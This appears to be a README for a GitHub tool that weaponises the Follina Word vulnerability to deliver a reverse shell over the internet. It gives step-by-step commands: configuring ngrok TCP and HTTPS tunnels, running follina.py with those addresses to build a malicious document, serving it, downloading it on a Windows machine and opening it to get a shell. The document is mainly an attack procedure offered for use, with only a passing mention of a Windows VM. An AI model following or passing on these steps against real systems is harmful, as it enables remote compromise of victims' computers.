# How to use Follina_Over_WAN Script
## Cloning the repo 
```bash
    git clone https://github.com/BlackstormCoder/Follina_Over_WAN.git
```
    

    
## Download `ngrok` for the port forwarding
- Create the account on [ngrok](https://ngrok.com/)
- Download the `ngrok`


OR

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
```

- unzip and move the binary to the `/usr/local/bin`

```bash
tar -xvf ngrok-v3-stable-linux-amd64.tgz
mv ngrok /usr/local/bin
```

- Connect your account to the `ngrok`

```bash
ngrok config add-authtoken <token>
```

## Set the `ngrok` and Run the exploit

- Open the `~/.config/ngrok/ngrok.yml` in your fav text editor.
- put this in that file.

```bash
tunnels:
    webserver:
        addr: 80
        proto: http
    follina_reverse:
        addr: 1337
        proto: tcp
```

- Run this command to start the `ngrok`

```bash
ngrok start --all
```

You will get this two url `tcp` and `https` 

`TCP` is used for the reverse shell

`https` is your webserver that will  have the script payload

```bash
Hello World! https://ngrok.com/next-generation

Session Status                online
Account                       REDACTED
Update                        update available (version 3.0.5-rc1, Ctrl-U to update)
Version                       3.0.4
Region                        REDACTED
Latency                       424ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://REDACTED.tcp.in.ngrok.io:18152 -> localhost:1337
Forwarding                    https://REDACTED.in.ngrok.io -> http://localhost:80
```

- Run the exploit

```powershell
➜  Follina_Over_WAN git:(main) python3 follina.py -h

  _        _   _                       __                    _            ___,  , _    
 | |      | | | | o                   /\_\/                 (_|   |   |_//   | /|/ \   
 | |  __  | | | |     _  _    __,    |    |      _   ,_       |   |   | |    |  |   |  
 |/  /  \_|/  |/  |  / |/ |  /  |    |    ||  |_|/  /  |      |   |   | |    |  |   |  
 |__/\__/ |__/|__/|_/  |  |_/\_/|_/   \__/  \/  |__/   |_/     \_/ \_/   \__/\_/|   |_/
 |\                                                                                    
 |/                                                                                    
by Blackstorm
usage: follina.py [-h] [--output OUTPUT] --url URL --ip IP --port PORT

This script is used to make a follina malicious word document with reverse shell binded on it.

options:
  -h, --help            show this help message and exit
  --output OUTPUT, -o OUTPUT
                        output maldoc file
  --url URL, -u URL     Provide ngrok webserver link
  --ip IP, -i IP        provide ngrok tcp address
  --port PORT, -p PORT  Provide ngrok tcp reverse port

I hope you enjoy your maldoc!
➜  Follina_Over_WAN git:(main)
```

```bash
python3 follina.py -u <put https://*.ngrok.io link> -i <put tcp link> -p <port in ngrok>
```

Example: 

```bash
python3 follina.py -u https://REDACTED.in.ngrok.io -i REDACTED.tcp.in.ngrok.io -p 18152
```

## Copy the `follina.doc` to windows VM and run it.

- Start the http webserver in the `Follina_Over_WAN` directory

```bash
python3 -m http.server 8080
```

```bash
┌──(kayo㉿whoami)-[~/Follina_Over_WAN]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.32.130 - - [24/Jun/2022 11:52:09] "GET /follina.doc HTTP/1.1" 200 -
```

- Download the Doc in the windows machine
    - Open the windows PowerShell
    
    ```powershell
    Invoke-WebRequest "192.168.32.128:8080/follina.doc" -OutFile follina.doc
    ```
    
- Open the `Follina.doc`
- Volia!!! You hacked it!! Congratulations !!!

If you want to know more detail about this vulnerability, Check out [my blog]() where I simply explained how it works.

---